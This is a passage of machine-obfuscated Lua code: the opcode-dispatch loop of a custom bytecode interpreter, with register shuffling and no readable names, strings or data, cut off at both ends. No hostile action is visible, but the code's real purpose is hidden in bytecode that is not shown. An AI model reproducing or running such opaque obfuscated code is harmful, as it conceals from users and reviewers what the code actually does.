w[y[469]]=w[y[345]]+y[491];elseif z==198 then local a;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];a=y[469]w[a]=w[a]()else w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;end;elseif z<=205 then if 202>=z then if z<=200 then w[y[469]]=w[y[345]]/y[491];n=n+1;y=f[n];w[y[469]]=w[y[345]]-w[y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]]/y[491];n=n+1;y=f[n];w[y[469]]=w[y[345]]*y[491];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];n=y[345];elseif z<202 then local a=y[469]local c,e=i(w[a](r(w,a+1,y[345])))p=e+a-1 local e=0;for ba=a,p do e=e+1;w[ba]=c[e];end;else w[y[469]]=w[y[345]][w[y[491]]];end;elseif 203>=z then w[y[469]]=w[y[345]]/y[491];elseif 204<z then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=#w[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469];w[a]=w[a]-w[a+2];n=y[345];else local a;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))end;elseif 208>=z then if z<=206 then local a;w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]][y[345]]=y[491];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))elseif z==207 then w[y[469]]=false;n=n+1;else if(w[y[469]]<=w[y[491]])then n=n+1;else n=y[345];end;end;elseif 209>=z then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];e=y[345];c=y[491];a=k(w,g,e,c);w[y[469]]=a;elseif z~=211 then local a=y[469]local c={w[a](w[a+1])};local e=0;for ba=a,y[491]do e=e+1;w[ba]=c[e];end else w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];if w[y[469]]then n=n+1;else n=y[345];end;end;elseif z<=223 then if z<=217 then if(z==214 or z<214)then if(212>=z)then if(w[y[469]]<=w[y[491]])then n=n+1;else n=y[345];end;elseif z<214 then w[y[469]]=w[y[345]]+w[y[491]];else local a,c=0 while true do if a<=9 then if a<=4 then if a<=1 then if a~=1 then c=nil else w[y[469]]=w[y[345]][y[491]];end else if a<=2 then n=n+1;else if a>3 then w[y[469]]=y[345];else y=f[n];end end end else if a<=6 then if a~=6 then n=n+1;else y=f[n];end else if a<=7 then w[y[469]]=h[y[345]];else if a==8 then n=n+1;else y=f[n];end end end end else if a<=14 then if a<=11 then if 10==a then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if a<=12 then y=f[n];else if 13<a then do return w[c](r(w,c+1,y[345]))end;else c=y[469];end end end else if a<=16 then if a<16 then n=n+1;else y=f[n];end else if a<=17 then c=y[469];else if a~=19 then do return r(w,c,p)end;else break end end end end end a=a+1 end end;elseif(215>z or 215==z)then local a,c,e,ba=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1~=a then c=nil else e=nil end else if a<=2 then ba=nil else if 3==a then w[y[469]]=j[y[345]];else n=n+1;end end end else if a<=6 then if 6~=a then y=f[n];else w[y[469]]=w[y[345]][y[491]];end else if a<=7 then n=n+1;else if 8<a then w[y[469]]=w[y[345]][y[491]];else y=f[n];end end end end else if a<=14 then if a<=11 then if a==10 then n=n+1;else y=f[n];end else if a<=12 then w[y[469]]=w[y[345]][y[491]];else if 13==a then n=n+1;else y=f[n];end end end else if a<=16 then if a~=16 then ba=y[469]else e={w[ba](w[ba+1])};end else if a<=17 then c=0;else if 19~=a then for bb=ba,y[491]do c=c+1;w[bb]=e[c];end else break end end end end end a=a+1 end elseif not(216~=z)then local a,c=0 while true do if a<=12 then if a<=5 then if a<=2 then if a<=0 then c=nil else if a==1 then w={};else for e=0,u,1 do if e<o then w[e]=s[e+1];else break;end;end;end end else if a<=3 then n=n+1;else if 4<a then w[y[469]]=h[y[345]];else y=f[n];end end end else if a<=8 then if a<=6 then n=n+1;else if a>7 then w[y[469]]=j[y[345]];else y=f[n];end end else if a<=10 then if a<10 then n=n+1;else y=f[n];end else if a<12 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end end end else if a<=18 then if a<=15 then if a<=13 then y=f[n];else if 14<a then n=n+1;else w[y[469]]=y[345];end end else if a<=16 then y=f[n];else if a==17 then w[y[469]]=y[345];else n=n+1;end end end else if a<=21 then if a<=19 then y=f[n];else if 20==a then w[y[469]]=y[345];else n=n+1;end end else if a<=23 then if 22<a then c=y[469]else y=f[n];end else if 25~=a then w[c]=w[c](r(w,c+1,y[345]))else break end end end end end a=a+1 end else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 0<a then w[y[469]]=h[y[345]];else c=nil end else if 2==a then n=n+1;else y=f[n];end end else if a<=5 then if 5>a then w[y[469]]=y[345];else n=n+1;end else if 7>a then y=f[n];else w[y[469]]=y[345];end end end else if a<=11 then if a<=9 then if 9>a then n=n+1;else y=f[n];end else if a<11 then w[y[469]]=y[345];else n=n+1;end end else if a<=13 then if a~=13 then y=f[n];else c=y[469]end else if 14<a then break else w[c]=w[c](r(w,c+1,y[345]))end end end end a=a+1 end end;elseif 220>=z then if 218>=z then w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];n=y[345];elseif z>219 then j[y[345]]=w[y[469]];else local a=y[469];local c=w[a];for e=a+1,p do t(c,w[e])end;end;elseif 221>=z then local a;local c;local e;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for ba=e,y[491]do a=a+1;w[ba]=c[a];end elseif z~=223 then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for ba=e,y[491]do a=a+1;w[ba]=c[a];end else local a=y[469];local c=w[y[345]];w[a+1]=c;w[a]=c[y[491]];end;elseif z<=229 then if z<=226 then if 224>=z then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for ba=e,y[491]do a=a+1;w[ba]=c[a];end elseif 225<z then local a;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))else local a;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))end;elseif z<=227 then local a;w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))elseif 228<z then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for ba=e,y[491]do a=a+1;w[ba]=c[a];end else local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for ba=e,y[491]do a=a+1;w[ba]=c[a];end end;elseif 232>=z then if z<=230 then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469];w[a]=w[a]-w[a+2];n=y[345];elseif 231<z then local a=y[469]w[a](r(w,a+1,y[345]))else local a;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))end;elseif 233>=z then local a=y[469]w[a](w[a+1])elseif z>234 then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for ba=e,y[491]do a=a+1;w[ba]=c[a];end else local a=y[469];local c=y[491];local e=a+2;local ba={w[a](w[a+1],w[e])};for bb=1,c do w[e+bb]=ba[bb];end local a=w[a+3];if a then w[e]=a;n=y[345];else n=n+1 end;end;elseif z<=258 then if 246>=z then if 240>=z then if 237>=z then if z==236 then local a;w[y[469]]={};n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]][w[y[345]]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]][w[y[345]]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]][w[y[345]]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]][w[y[345]]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]][w[y[345]]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]][w[y[345]]]=w[y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]][w[y[345]]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];a=y[469]w[a](r(w,a+1,y[345]))else local a;w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))end;elseif z<=238 then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];e=y[345];c=y[491];a=k(w,g,e,c);w[y[469]]=a;elseif z>239 then local a;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))else w[y[469]]=w[y[345]];end;elseif z<=243 then if z<=241 then local a;w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]][y[345]]=y[491];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))elseif z~=243 then if(w[y[469]]<w[y[491]])then n=n+1;else n=y[345];end;else local a;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];a=y[469]w[a](r(w,a+1,y[345]))end;elseif 244>=z then local a;local c;local e;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];e=y[345];c=y[491];a=k(w,g,e,c);w[y[469]]=a;elseif z~=246 then local a;w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))else w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;end;elseif 252>=z then if z<=249 then if z<=247 then local a=y[469]local c={}for e=1,#v do local ba=v[e]for bb=1,#ba do local ba=ba[bb]local bb,bb=ba[1],ba[2]if(bb==a or bb>a)then c[bb]=w[bb]ba[1]=c v[e]=nil;end end end elseif z~=249 then w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];if(w[y[469]]~=w[y[491]])then n=n+1;else n=y[345];end;else local a;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))end;elseif 250>=z then local a,c=0 while true do if a<=79 then if a<=39 then if a<=19 then if a<=9 then if a<=4 then if a<=1 then if 0==a then c=nil else w[y[469]]=h[y[345]];end else if a<=2 then n=n+1;else if a>3 then w[y[469]]=w[y[345]][y[491]];else y=f[n];end end end else if a<=6 then if 6~=a then n=n+1;else y=f[n];end else if a<=7 then w[y[469]]=h[y[345]];else if a~=9 then n=n+1;else y=f[n];end end end end else if a<=14 then if a<=11 then if a~=11 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if a<=12 then y=f[n];else if a<14 then w[y[469]][w[y[345]]]=w[y[491]];else n=n+1;end end end else if a<=16 then if 16~=a then y=f[n];else w[y[469]]=h[y[345]];end else if a<=17 then n=n+1;else if a~=19 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end end else if a<=29 then if a<=24 then if a<=21 then if a~=21 then n=n+1;else y=f[n];end else if a<=22 then w[y[469]]=h[y[345]];else if 24~=a then n=n+1;else y=f[n];end end end else if a<=26 then if 26>a then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if a<=27 then y=f[n];else if a~=29 then w[y[469]][w[y[345]]]=w[y[491]];else n=n+1;end end end end else if a<=34 then if a<=31 then if 30<a then w[y[469]]=h[y[345]];else y=f[n];end else if a<=32 then n=n+1;else if 33==a then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if a<=36 then if 35==a then n=n+1;else y=f[n];end else if a<=37 then w[y[469]]=h[y[345]];else if 39>a then n=n+1;else y=f[n];end end end end end end else if a<=59 then if a<=49 then if a<=44 then if a<=41 then if 40<a then n=n+1;else w[y[469]]=w[y[345]][y[491]];end else if a<=42 then y=f[n];else if a~=44 then w[y[469]][w[y[345]]]=w[y[491]];else n=n+1;end end end else if a<=46 then if a<46 then y=f[n];else w[y[469]]=h[y[345]];end else if a<=47 then n=n+1;else if a==48 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end else if a<=54 then if a<=51 then if a==50 then n=n+1;else y=f[n];end else if a<=52 then w[y[469]]=h[y[345]];else if 53<a then y=f[n];else n=n+1;end end end else if a<=56 then if a<56 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if a<=57 then y=f[n];else if 58==a then w[y[469]][w[y[345]]]=w[y[491]];else n=n+1;end end end end end else if a<=69 then if a<=64 then if a<=61 then if 60<a then w[y[469]]=h[y[345]];else y=f[n];end else if a<=62 then n=n+1;else if a>63 then w[y[469]]=w[y[345]][y[491]];else y=f[n];end end end else if a<=66 then if a~=66 then n=n+1;else y=f[n];end else if a<=67 then w[y[469]]=h[y[345]];else if 68<a then y=f[n];else n=n+1;end end end end else if a<=74 then if a<=71 then if a==70 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if a<=72 then y=f[n];else if a~=74 then w[y[469]][w[y[345]]]=w[y[491]];else n=n+1;end end end else if a<=76 then if a==75 then y=f[n];else w[y[469]]=h[y[345]];end else if a<=77 then n=n+1;else if 79~=a then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end end end end else if a<=119 then if a<=99 then if a<=89 then if a<=84 then if a<=81 then if a==80 then n=n+1;else y=f[n];end else if a<=82 then w[y[469]]=h[y[345]];else if a~=84 then n=n+1;else y=f[n];end end end else if a<=86 then if 85<a then n=n+1;else w[y[469]]=w[y[345]][y[491]];end else if a<=87 then y=f[n];else if a~=89 then w[y[469]][w[y[345]]]=w[y[491]];else n=n+1;end end end end else if a<=94 then if a<=91 then if 90<a then w[y[469]]=h[y[345]];else y=f[n];end else if a<=92 then n=n+1;else if a~=94 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if a<=96 then if 95<a then y=f[n];else n=n+1;end else if a<=97 then w[y[469]]=h[y[345]];else if a==98 then n=n+1;else y=f[n];end end end end end else if a<=109 then if a<=104 then if a<=101 then if 100<a then n=n+1;else w[y[469]]=w[y[345]][y[491]];end else if a<=102 then y=f[n];else if a~=104 then w[y[469]][w[y[345]]]=w[y[491]];else n=n+1;end end end else if a<=106 then if 106~=a then y=f[n];else w[y[469]]=h[y[345]];end else if a<=107 then n=n+1;else if a~=109 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end else if a<=114 then if a<=111 then if a<111 then n=n+1;else y=f[n];end else if a<=112 then w[y[469]]=h[y[345]];else if a==113 then n=n+1;else y=f[n];end end end else if a<=116 then if a==115 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if a<=117 then y=f[n];else if 119~=a then w[y[469]][w[y[345]]]=w[y[491]];else n=n+1;end end end end end end else if a<=139 then if a<=129 then if a<=124 then if a<=121 then if 121~=a then y=f[n];else w[y[469]]=h[y[345]];end else if a<=122 then n=n+1;else if 123==a then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if a<=126 then if 126~=a then n=n+1;else y=f[n];end else if a<=127 then w[y[469]]=h[y[345]];else if a==128 then n=n+1;else y=f[n];end end end end else if a<=134 then if a<=131 then if a==130 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if a<=132 then y=f[n];else if a>133 then n=n+1;else w[y[469]][w[y[345]]]=w[y[491]];end end end else if a<=136 then if 135==a then y=f[n];else w[y[469]]=h[y[345]];end else if a<=137 then n=n+1;else if a>138 then w[y[469]]=w[y[345]][y[491]];else y=f[n];end end end end end else if a<=149 then if a<=144 then if a<=141 then if 140==a then n=n+1;else y=f[n];end else if a<=142 then w[y[469]]=h[y[345]];else if 144~=a then n=n+1;else y=f[n];end end end else if a<=146 then if 146~=a then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if a<=147 then y=f[n];else if a<149 then w[y[469]][w[y[345]]]=w[y[491]];else n=n+1;end end end end else if a<=154 then if a<=151 then if a>150 then w[y[469]]=j[y[345]];else y=f[n];end else if a<=152 then n=n+1;else if 154~=a then y=f[n];else w[y[469]]=w[y[345]];end end end else if a<=156 then if a<156 then n=n+1;else y=f[n];end else if a<=157 then c=y[469]else if a==158 then w[c]=w[c](w[c+1])else break end end end end end end end end a=a+1 end elseif 251<z then w[y[469]]=j[y[345]];else w[y[469]][y[345]]=w[y[491]];end;elseif z<=255 then if 253>=z then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for ba=e,y[491]do a=a+1;w[ba]=c[a];end elseif 255~=z then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for ba=e,y[491]do a=a+1;w[ba]=c[a];end else do return end;end;elseif 256>=z then w[y[469]]=w[y[345]]+w[y[491]];elseif z==257 then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for ba=e,y[491]do a=a+1;w[ba]=c[a];end else local a=y[345];local c=y[491];local a=k(w,g,a,c);w[y[469]]=a;end;elseif z<=270 then if z<=264 then if z<=261 then if 259>=z then local a=y[469];local c=w[a];for e=(a+1),y[345]do t(c,w[e])end;elseif z==260 then n=y[345];else w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];if(w[y[469]]~=w[y[491]])then n=n+1;else n=y[345];end;end;elseif z<=262 then do return end;elseif 263==z then w[y[469]]=w[y[345]]+y[491];else local a;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];a=y[469]w[a]=w[a](w[a+1])end;elseif 267>=z then if z<=265 then local a=y[469];local c=w[y[345]];w[a+1]=c;w[a]=c[y[491]];elseif 266<z then local a;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))else w[y[469]]=true;end;elseif z<=268 then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 0<a then w[y[469]]=h[y[345]];else c=nil end else if a==2 then n=n+1;else y=f[n];end end else if a<=5 then if a~=5 then w[y[469]]=y[345];else n=n+1;end else if a>6 then w[y[469]]=y[345];else y=f[n];end end end else if a<=11 then if a<=9 then if 9~=a then n=n+1;else y=f[n];end else if 11>a then w[y[469]]=y[345];else n=n+1;end end else if a<=13 then if a==12 then y=f[n];else c=y[469]end else if a==14 then w[c]=w[c](r(w,c+1,y[345]))else break end end end end a=a+1 end elseif 270>z then n=y[345];else w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];do return w[y[469]]end end;elseif z<=276 then if z<=273 then if 271>=z then local a;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];a=y[469]w[a]=w[a](w[a+1])elseif 272<z then local a=y[469];do return r(w,a,p)end;else local a=y[469];w[a]=w[a]-w[a+2];n=y[345];end;elseif 274>=z then local a;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]]*y[491];n=n+1;y=f[n];w[y[469]]=w[y[345]]+w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]]+w[y[491]];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))elseif z~=276 then local a;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))else w[y[469]]=y[345]*w[y[491]];end;elseif 279>=z then if z<=277 then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for ba=e,y[491]do a=a+1;w[ba]=c[a];end elseif 278==z then h[y[345]]=w[y[469]];else local a=y[469];do return r(w,a,p)end;end;elseif 280>=z then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];if w[y[469]]then n=n+1;else n=y[345];end;elseif 282~=z then if(y[469]<=w[y[491]])then n=n+1;else n=y[345];end;else w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];if w[y[469]]then n=n+1;else n=y[345];end;end;elseif z<=329 then if z<=305 then if 293>=z then if(z==287 or z<287)then if(z<284 or z==284)then if z<284 then local a=y[469];p=(a+x-1);for c=a,p do local a=q[(c-a)];w[c]=a;end;else local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if 0<a then w[y[469]]=w[y[345]][y[491]];else c=nil end else if a<3 then n=n+1;else y=f[n];end end else if a<=5 then if 5>a then 